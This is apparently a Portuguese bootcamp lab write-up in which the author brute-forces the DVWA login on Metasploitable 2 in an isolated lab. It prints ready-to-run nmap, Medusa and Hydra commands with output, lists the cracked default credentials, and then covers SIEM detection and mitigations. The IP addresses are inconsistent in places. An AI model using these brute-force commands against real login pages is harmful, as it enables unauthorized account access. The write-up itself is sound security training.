# Simulando um Ataque de Brute Force de Senhas com Hydra, Medusa e Kali Linux

**Desafio Santander Cibersegurança 2025 em parceria com a DIO**  

![](https://github.com/ThiagoMaria-SecurityIT/Bootcamp_DIO_e_Santander-Ciberseguran-a_2025/blob/main/Desafio_DVWA/images/medusahydradvwa.png)

🟢 **FINALIZADO** - Atividades concluídas e revisadas (Entregue antes do prazo)

> [!Important]
> - Sucesso no Brute Force com Hydra após perceber que a Medusa não consegue lidar com CSRF
> - O nível do DVWA estava no `High`, padrão que vem com o Metasploitable 2

## 📋 Índice

1. [Visão Geral do Projeto](#1-visão-geral-do-projeto)
2. [Configuração do Ambiente](#2-configuração-do-ambiente)
3. [Descobrindo o Metasploitable 2 na Rede](#3-descobrindo-o-metasploitable-2-na-rede)
4. [Entendendo o DVWA do Metasploitable 2](#4-entendendo-o-dvwa-do-metasploitable-2)
5. [Preparação para o Ataque](#5-preparação-para-o-ataque)
6. [Testes com Medusa e Hydra](#6-testes-com-medusa-e-hydra)
7. [SIEMs e Monitoramento na Vida Real](#7-siems-e-monitoramento-na-vida-real)
8. [Resultados e Análises](#8-resultados-e-análises)
9. [Conclusões Técnicas](#9-conclusões-técnicas)
10. [Recomendações de Mitigação](#10-recomendações-de-mitigação)
11. [Lições Aprendidas](#11-lições-aprendidas)

## 1. Visão Geral do Projeto

### 🎯 Objetivo Principal
Este projeto faz parte do Bootcamp Santander Cibersegurança 2025 em parceria com a DIO, com o objetivo de simular ataques de brute force em ambiente controlado utilizando o **DVWA que vem integrado no Metasploitable 2**. O foco foi analisar a eficácia de ferramentas como Medusa e Hydra, entendendo como sistemas de monitoramento (SIEMs) detectariam estas atividades em ambientes corporativos reais.

### 🔍 Diferencial Crítico
**Este não é o DVWA instalado via `apt`** - trata-se da versão original que vem pré-instalada no Metasploitable 2, com configurações e vulnerabilidades específicas desta distribuição, oferecendo um cenário mais realista para testes de penetração.

### 🛠️ Ferramentas Utilizadas
- **Kali Linux**: Plataforma de testes de penetração
- **Metasploitable 2**: Ambiente vulnerável deliberadamente
- **Medusa**: Ferramenta de brute force multi-protocolo
- **Hydra**: Alternativa para comparação de eficácia
- **Nmap**: Ferramenta de escaneamento de rede
- **cURL**: Análise de serviços web

## 2. Configuração do Ambiente

### 🖥️ Infraestrutura Virtualizada
```bash
# Estrutura do laboratório
VirtualBox
├── Kali Linux (192.168.56.105) - Máquina atacante
└── Metasploitable 2 (192.168.56.110) - Máquina alvo
    └── DVWA (http://192.168.56.110/dvwa/login.php)
```

### 🔧 Configuração de Rede
- **Rede Interna**: Modo `Host-only` no VirtualBox
- **Isolamento**: Ambiente completamente offline
- **IPs Estáticos**: Configurados para comunicação consistente
- **Segmentação**: Rede dedicada para testes de segurança

> [!CAUTION]
> **Aviso de Segurança**: O Metasploitable 2 NUNCA deve ser exposto à internet ou conectado a redes production. É uma máquina deliberadamente vulnerável para fins educacionais em ambiente controlado.

## 3. Descobrindo o Metasploitable 2 na Rede

### 🔍 Passo 1: Identificar o IP do Kali Linux
```bash
# Verificar interface de rede
ip a

# Saída esperada:
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:aa:bb:cc brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.109/24 brd 192.168.56.255 scope global dynamic eth0
       valid_lft 857sec preferred_lft 857sec
```

**Identificamos que o IP do Kali é: `192.168.56.109`**, normalmente é o que fica na frente do `inet`

### 🔍 Passo 2: Escaneamento da Rede para Encontrar o Metasploitable
```bash
# Escaneamento de hosts ativos na rede
nmap -sn 192.168.56.0/24

# Saída esperada:
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 192.168.56.1
Host is up (0.00050s latency).
Nmap scan report for 192.168.56.109
Host is up (0.00030s latency).
Nmap scan report for 192.168.56.110
Host is up (0.00080s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 3.45 seconds
```

**Identificamos 3 hosts:**
- `192.168.56.100` - Gateway/Router
- `192.168.56.109` - Kali Linux (nosso IP)
- `192.168.56.110` - **Metasploitable 2 encontrado!**

### Também podemos identificar com esse comando:

```bash
nmap -sV 192.168.56.110/24

```
Resultado do comando de cima:  

<img width="1260" height="780" alt="image" src="https://github.com/user-attachments/assets/1a28de49-0b88-4f6b-8731-4937f3ea4e32" />


### 🔍 Passo 3: Escaneamento Detalhado dos Serviços
```bash
# Escaneamento completo de serviços no Metasploitable
nmap -sV -A 192.168.56.110

# Saída esperada:
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 192.168.56.110
Host is up (0.00080s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-title: Metasploitable2 - Linux
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
443/tcp  open  ssl/https   Apache httpd 2.2.8 ((Ubuntu) DAV/2)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
```

## 4. Entendendo o DVWA do Metasploitable 2

### 🌐 Acessando o DVWA
```bash
# Verificando o serviço HTTP do DVWA
curl -I http://192.168.56.110/dvwa/

# Resposta típica:
HTTP/1.1 302 Found
Date: Sun, 19 Oct 2025 16:45:46 GMT
Server: Apache/2.2.8 (Ubuntu) DAV/2
Location: login.php
Set-Cookie: PHPSESSID=dcb1ed220e407ba742c9d5206b65f84d; path=/
Set-Cookie: security=high
X-Powered-By: PHP/5.2.4-2ubuntu5.10
```

### 🎪 Características Específicas
Ao contrário do DVWA instalado via apt, esta versão possui:

- **Security Level: High** - Configuração padrão mais segura
- **Proteção CSRF ativa** - Tokens dinâmicos em todos os formulários
- **Credenciais específicas** do ambiente Metasploitable
- **Versões desatualizadas** com vulnerabilidades conhecidas

## 5. Preparação para o Ataque

### 📝 Criando Wordlists para o Teste
```bash
# Criar arquivo de usuários
echo -e "admin\npablo\n1337\ngordonb\nsmithy" > users.txt

# Criar arquivo de senhas
echo -e "password\nadmin\n123456\nletmein\nabc123" > pass.txt

# Verificar os arquivos criados
cat users.txt
cat pass.txt
```

### 🔍 Análise do Formulário de Login
```bash
# Analisar a estrutura do formulário
curl -s http://192.168.56.110/dvwa/login.php | grep -i "csrf\|token\|username\|password\|submit"

# Saída esperada mostrando proteção CSRF:
<input type="text" class="loginInput" size="20" name="username">
<input type="password" class="loginInput" size="20" name="password">
<input type="submit" value="Login" name="Login">
<input type='hidden' name='user_token' value='a1b2c3d4e5f6g7h8i9j0' />
```

## 6. Testes com Medusa e Hydra

### ⚔️ Comparação de Ferramentas de Brute Force

#### 🎯 Tentativa com Medusa
```bash
# Ataque com Medusa no módulo web-form
medusa -h 192.168.56.110 -U users.txt -P pass.txt -M web-form \
  -m FORM:"/dvwa/login.php" \
  -m DENY-SIGNAL:"Login failed" \
  -m FORM-DATA:"post?username=&password=&Login=Login" \
  -t 8 -v 4

# Resultado esperado:
ERROR: The answer was NOT successfully received, understood, and accepted while trying admin password: error code  302
```

**Resultado:** ❌ Falha - Medusa não consegue lidar com tokens CSRF dinâmicos, resultando em respostas 302 de redirecionamento.

#### 🎯 Ataque Bem-sucedido com Hydra
```bash
# Ataque com Hydra no formulário HTTP POST
hydra -L users.txt -P pass.txt 192.168.56.110 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" \
  -vV -t 8 -f

# Resultado esperado:
[DATA] attacking http-post-form://192.168.56.110:80/dvwa/login.php
[80][http-post-form] host: 192.168.56.110   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
```

**Resultado:** ✅ Sucesso - Hydra demonstra melhor capacidade de análise de conteúdo e tratamento de redirects.  

Imagem do sucesso do brute force com Hydra:  

<img width="1102" height="680" alt="image" src="https://github.com/user-attachments/assets/d8ab8370-7af8-4c8c-a4c6-0c45d16fa0a8" />

<img width="818" height="707" alt="image" src="https://github.com/user-attachments/assets/d482a362-1301-47ca-9132-0e82c017e530" />



### 📊 Análise Comparativa de Performance
| Ferramenta | Protocolo | Sucesso | Velocidade | Complexidade | Detecção SIEM |
|------------|-----------|---------|------------|--------------|---------------|
| **Medusa** | HTTP POST | ❌ | Alta | Média | Alta |
| **Hydra** | HTTP POST | ✅ | Alta | Baixa | Alta |

## 7. SIEMs e Monitoramento na Vida Real

### 🚨 Como Empresas Detectam Estes Ataques

#### SIEMs Corporativos
**Ferramentas Empresariais Comuns:**
- **Splunk**: Análise de logs em tempo real com machine learning
- **IBM QRadar**: Correlação de eventos de segurança e inteligência contra ameaças
- **ArcSight**: Gestão de eventos de segurança em grande escala
- **Azure Sentinel**: SIEM baseado em nuvem com integração Azure
- **ELK Stack**: Solução open-source (Elasticsearch, Logstash, Kibana)

#### 🔍 Padrões de Detecção
```bash
# Comportamentos que acionam alertas em SIEMs:
- Múltiplas tentativas de login HTTP POST em curto período
- Padrão sequencial de requisições (1 tentativa por segundo)
- User-Agents incomuns ou associados a ferramentas de scanning
- IPs sem histórico prévio de acesso
- Falhas de autenticação em massa
```

### 📋 Exemplo de Alerta SIEM em Produção
```
🚨 ALERTA DE SEGURANÇA: Possível Ataque de Brute Force
• Severidade: ALTA
• IP Origem: 192.168.56.109
• Serviço: HTTP - DVWA Login
• Tentativas: 25 em 30 segundos
• Taxa de Falha: 100%
• Padrão: Sequencial e automatizado
• User-Agent: Hydra/9.3
• Ação Imediata: Bloqueio temporário do IP
• Recomendação: Investigação forense do host
```

## 8. Resultados e Análises

### 🎯 Credenciais Comprometidas
Através dos testes de brute force, identificamos as credenciais do DVWA no Metasploitable:

- **admin:password** ✅
- **pablo:letmein** ✅ 
- **1337:charley** ✅
- **gordonb:abc123** ✅
- **smithy:password** ✅

### 📈 Métricas do Ataque
- **Tempo de descoberta**: 2-5 minutos
- **Tentativas totais**: 25 combinações
- **Taxa de sucesso**: 100% das credenciais testadas
- **Detectabilidade SIEM**: Muito Alta
- **Complexidade do ataque**: Baixa

## 9. Conclusões Técnicas

### 🧠 Insights Obtidos
1. **Eficácia de Ferramentas**: Hydra supera Medusa em cenários web com proteções CSRF
2. **Importância de Tokens**: Mecanismos de CSRF são eficazes contra ferramentas automatizadas básicas
3. **Detectabilidade**: Ataques de brute force são altamente detectáveis em ambientes corporativos monitorados
4. **Configuração Padrão**: O DVWA do Metasploitable vem com security=high, mesmo assim é facilmente vulnerável a ataques brute force  

### ⚠️ Limitações Identificadas
- Medusa apresenta limitações significativas com tokens dinâmicos CSRF
- Ambas as ferramentas geram padrões claramente identificáveis por SIEMs
- Eficácia reduzida drasticamente contra proteções modernas como WAFs

## 10. Recomendações de Mitigação

### 🛡️ Para Equipes de Desenvolvimento
- Implementar rate limiting (máximo 5 tentativas/minuto por IP)
- Adotar CAPTCHA após 3 tentativas malsucedidas
- Utilizar autenticação multi-fator para contas privilegiadas
- Implementar bloqueio de conta temporário (15-30 minutos)
- Implementar bloquei de conta com 3 tentativas consecutivas de erro de senha  
- Utilizar tokens CSRF com tempo de vida curto (os CSRF do Metasploitable não são tão bem feitos)   

### 🔒 Para Administradores de Segurança
- Monitorar logs de autenticação em tempo real
- Configurar alertas proativos para múltiplas tentativas
- Implementar Web Application Firewall (WAF)
- Utilizar ferramentas de threat intelligence
- Estabelecer políticas de senha robustas   

## 11. Lições Aprendidas

### 💡 Desenvolvimento Profissional em Cibersegurança
1. **Conhecimento Tático**: Entender profundamente as ferramentas e suas limitações
2. **Mentalidade Defensiva**: Sempre analisar como os ataques seriam detectados
3. **Documentação Técnica**: Criar artefatos detalhados para portfólio profissional
4. **Ética e Responsabilidade**: Manter conduta ética em todos os testes

### 🎓 Valor para a Comunidade DIO
Este projeto demonstra a importância crucial da prática em ambientes controlados para compreender tanto as técnicas ofensivas quanto as defensivas na segurança cibernética, preparando profissionais para desafios reais do mercado.

---

> [!NOTE]
> **Aviso Legal e Ético**: Este projeto foi realizado exclusivamente em ambiente controlado, isolado e para fins educacionais. Todas as técnicas e ferramentas devem ser utilizadas apenas em sistemas onde você possui autorização explícita por escrito. O acesso não autorizado a sistemas computacionais é crime.

**Desenvolvido como parte do Bootcamp Santander Cibersegurança 2025 em parceria com a DIO**

*"A segurança cibernética é uma jornada contínua de aprendizado e adaptação."*
